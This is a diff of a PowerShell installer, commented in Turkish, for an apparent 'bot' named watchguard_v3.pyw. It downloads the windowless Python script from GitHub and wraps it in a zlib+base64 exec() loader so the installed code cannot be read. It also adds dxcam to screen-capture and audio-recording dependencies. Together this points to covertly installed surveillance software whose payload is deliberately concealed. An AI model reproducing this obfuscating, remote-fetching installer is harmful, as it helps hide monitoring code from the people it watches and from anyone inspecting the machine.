@@ -292,42 +292,70 @@ try {
 
 Remove-Item $tempPy -Force -ErrorAction SilentlyContinue
 
-# ── 4. watchguard_v3.pyw'yi kopyala veya indir ──────────────────────────────
+# ── 4. watchguard_v3.pyw'yi indir ve obfüske et ─────────────────────────────
 
 Write-Header "ADIM 4: Bot Scripti"
 
 $scriptDest = Join-Path $datDir "watchguard_v3.pyw"
 $scriptUrl  = "https://raw.githubusercontent.com/zygomatic-git/watchguard/main/watchguard_v3.pyw"
-
 $localScript = Join-Path $PSScriptRoot "watchguard_v3.pyw"
+$tempScript  = [System.IO.Path]::GetTempFileName() + '.pyw'
 
+# Önce kaynak dosyayı geçici konuma al
 if (Test-Path $localScript) {
-    Write-Step "Yerel watchguard_v3.pyw kopyalaniyor..."
-    try {
-        Copy-Item $localScript $scriptDest -Force
-        Write-OK "Script kopyalandi: $scriptDest"
-    } catch {
-        Write-Err "Kopyalama hatasi: $_"
-        exit 1
-    }
-} elseif ($scriptUrl -ne "PLACEHOLDER_GITHUB_RAW_URL") {
+    Write-Step "Yerel watchguard_v3.pyw kullaniliyor..."
+    Copy-Item $localScript $tempScript -Force
+    Write-OK "Kaynak hazir (yerel)"
+} else {
     Write-Step "watchguard_v3.pyw indiriliyor..."
     try {
-        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptDest -UseBasicParsing
-        Write-OK "Script indirildi: $scriptDest"
+        Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScript -UseBasicParsing
+        Write-OK "Kaynak indirildi"
     } catch {
         Write-Err "Indirme hatasi: $_"
-        Write-Info "URL: $scriptUrl"
         Read-Host "Cikis icin Enter'a basin"
         exit 1
     }
-} else {
-    Write-Err "watchguard_v3.pyw bulunamadi!"
-    Write-Info "Asagidakilerden birini yapin:"
-    Write-Info "  1) Bu scripti watchguard_v3.pyw ile ayni klasore koyun"
-    Write-Info "  2) install.ps1 icindeki PLACEHOLDER_GITHUB_RAW_URL'yi doldurun"
-    Read-Host "Cikis icin Enter'a basin"
+}
+
+# Python ile zlib+base64 obfüskasyonu uygula
+Write-Step "Obfuskasyon uygulanıyor..."
+
+$obfPy = @"
+import zlib, base64, sys
+
+src = sys.argv[1]
+dst = sys.argv[2]
+
+with open(src, 'r', encoding='utf-8') as f:
+    source = f.read()
+
+encoded = base64.b64encode(zlib.compress(source.encode('utf-8'))).decode('ascii')
+loader  = "import zlib,base64;exec(zlib.decompress(base64.b64decode(b'" + encoded + "')).decode())"
+
+with open(dst, 'w', encoding='utf-8') as f:
+    f.write(loader)
+
+print('OK')
+"@
+
+$tempObfPy = [System.IO.Path]::GetTempFileName() + '.py'
+$obfPy | Out-File -FilePath $tempObfPy -Encoding UTF8 -NoNewline
+
+try {
+    $obfResult = & $pythonExe $tempObfPy $tempScript $scriptDest 2>&1
+    if ($obfResult -like "OK*") {
+        Write-OK "Script obfüske edildi: $scriptDest"
+    } else {
+        Write-Err "Obfuskasyon hatasi: $obfResult"
+        Remove-Item $tempObfPy, $tempScript -Force -ErrorAction SilentlyContinue
+        exit 1
+    }
+} catch {
+    Write-Err "Obfuskasyon calistirilamadi: $_"
     exit 1
+} finally {
+    Remove-Item $tempObfPy, $tempScript -Force -ErrorAction SilentlyContinue
 }
 
 # ── 5. Python paketlerini yükle ──────────────────────────────────────────────
@@ -348,7 +376,8 @@ $packages = @(
     "screeninfo",
     "mss",
     "sounddevice",
-    "soundfile"
+    "soundfile",
+    "dxcam"
 )
 
 Write-Step "Bagimliliklar yukleniyor ($($packages.Count) paket)..."
